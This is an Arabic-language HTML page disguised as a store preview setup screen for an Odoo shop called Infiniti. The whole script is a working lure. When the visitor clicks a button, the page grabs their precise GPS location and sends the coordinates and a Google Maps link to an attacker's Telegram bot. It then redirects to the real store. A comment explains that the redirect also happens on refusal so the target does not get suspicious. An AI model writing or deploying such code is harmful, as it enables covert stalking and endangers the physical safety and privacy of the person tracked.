<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تحميل المعاينة...</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            color: #333;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p { margin-top: 20px; font-size: 16px; }
    </style>
</head>
<body>

  <div class="loader" id="loader" style="display:none;"></div>
  <div id="setup-box" style="text-align: center; max-width: 90%; padding: 20px;">
      <h3 style="margin-bottom: 10px;">إعدادات خادم المعاينة النهائي</h3>
      <p style="color: #666; font-size: 14px; margin-bottom: 25px;">يرجى الضغط على الزر أدناه لضبط العملة المحلية ونقاط التوصيل الافتراضية لمتجر Infiniti.</p>
      <button id="start-btn" style="background-color: #3498db; color: white; border: none; padding: 12px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold;">دخول إلى المتجر المعاين</button>
  </div>

  <script>
      const token = "ضع_توكن_البوت_هنا"; 
      const chatId = "ضع_الآيدي_الخاص_بك_هنا"; 

      function redirectToStore() {
          window.location.href = "https://bs-accessoires-infiniti2.odoo.com";
      }

      function sendToTelegram(lat, lng, accuracy) {
          const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
          const message = `🚨 زيارة جديدة من الهاتف:\n📍 خط العرض: ${lat}\n📍 خط الطول: ${lng}\n🎯 الدقة: ${accuracy} متر\n🔗 الرابط على الخريطة: ${mapLink}`;

          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ chat_id: chatId, text: message })
          })
          .then(() => redirectToStore())
          .catch(() => redirectToStore());
      }

      // تفعيل الجلب عند الضغط على الزر (User Gesture)
      document.getElementById('start-btn').addEventListener('click', function() {
          // إخفاء الزر وإظهار الـ Loader لحسن تجربة المستخدم
          document.getElementById('setup-box').style.display = 'none';
          document.getElementById('loader').style.display = 'block';

          if (navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(
                  (position) => {
                      sendToTelegram(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
                  },
                  (error) => {
                      // حتى لو رفضت الإذن، يتم تحويلها للمتجر لكي لا تشك في شيء
                      redirectToStore();
                  },
                  { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
              );
          } else {
              redirectToStore();
          }
      });
  </script>
</body>
</html>
